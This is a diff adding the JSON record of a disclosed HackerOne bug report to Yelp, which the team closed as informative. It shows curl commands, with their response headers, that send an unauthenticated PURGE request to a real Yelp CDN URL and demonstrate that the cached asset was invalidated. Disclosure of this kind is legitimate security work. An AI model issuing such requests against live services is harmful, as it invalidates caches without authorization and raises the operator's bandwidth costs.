@@ -1,0 +1,111 @@
+{
+  "id": 629612,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk2MTI=",
+  "url": "https://hackerone.com/reports/629612",
+  "title": "PURGE is not authenticated",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "low",
+  "readable_substate": "Informative",
+  "created_at": "2019-06-26T01:29:34.709Z",
+  "submitted_at": "2019-06-26T01:29:34.709Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rac_fckscty",
+    "url": "/rac_fckscty",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fqp7leprf2f74cj2tlzyip2yk4xu/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 545,
+    "url": "https://hackerone.com/yelp",
+    "handle": "yelp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Yelp",
+      "twitter_handle": "",
+      "website": "https://www.yelp.com",
+      "about": "Connecting people to great local businesses in communities around the world."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-01-19T18:07:20.090Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-10-07T17:10:19.720Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi @yelp Team,\n\nAnyone can issue a PURGE request for any resource and invalidate your caches. That can lead to increased bandwidth costs.\n\nFetching the resource headers, we can see in the `X-Cache-Hits: 1, 14` :\n```\nE:\\>curl https://s3-media0.fl.yelpcdn.com/assets/public/pride@2x.yelp_design_web.yji-629fce3629585b9db2137d9353196628.png --head\nHTTP/1.1 200 OK\nETag: \"629fce3629585b9db2137d9353196628\"\nx-amz-version-id: KnfcY6QenKubeC6DBXpUT1d87B17ORdD\nContent-Type: image/png\nServer: AmazonS3\nVia: 1.1 varnish\nAccess-Control-Allow-Origin: *\nContent-Length: 17079\nAccept-Ranges: bytes\nDate: Wed, 26 Jun 2019 01:22:10 GMT\nVia: 1.1 varnish\nConnection: keep-alive\nX-Served-By: cache-sjc3141-SJC, cache-hkg17922-HKG\nX-Cache: HIT, HIT\nX-Cache-Hits: 1, 14\nX-Timer: S1561512131.889727,VS0,VE0\nCache-Control: max-age=315360000, immutable\nTiming-Allow-Origin: *\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n```\n\nUnauthenticated purge request:\n```\nE:\\>curl https://s3-media0.fl.yelpcdn.com/assets/public/pride@2x.yelp_design_web.yji-629fce3629585b9db2137d9353196628.png --head -XPURGE\nHTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 46\nAccept-Ranges: bytes\nDate: Wed, 26 Jun 2019 01:22:17 GMT\nX-Varnish: 1668603163\nVia: 1.1 varnish\nConnection: keep-alive\nX-Served-By: cache-hkg17923-HKG\n```\n\nHeader `X-Cache-Hits: 1, 0`:\n```\nE:\\>curl https://s3-media0.fl.yelpcdn.com/assets/public/pride@2x.yelp_design_web.yji-629fce3629585b9db2137d9353196628.png --head\nHTTP/1.1 200 OK\nETag: \"629fce3629585b9db2137d9353196628\"\nx-amz-version-id: 8qpzJuX00EuyeMTUm5QGEHehZ2rbfRmQ\nContent-Type: image/png\nServer: AmazonS3\nVia: 1.1 varnish\nAccess-Control-Allow-Origin: *\nContent-Length: 17079\nAccept-Ranges: bytes\nDate: Wed, 26 Jun 2019 01:22:20 GMT\nVia: 1.1 varnish\nConnection: keep-alive\nX-Served-By: cache-sjc3129-SJC, cache-hkg17923-HKG\nX-Cache: HIT, MISS\nX-Cache-Hits: 1, 0\nX-Timer: S1561512140.209567,VS0,VE151\nCache-Control: max-age=315360000, immutable\nTiming-Allow-Origin: *\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n```\n\n## Impact\n\nThat can lead to increased bandwidth costs.",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 8,
+  "voters": [
+    "0utlawh4ck3r",
+    "zy9ard3",
+    "shubham_srt",
+    "kerolesmagdy",
+    "safu21",
+    "finho",
+    "ymy0x01",
+    "meispi"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
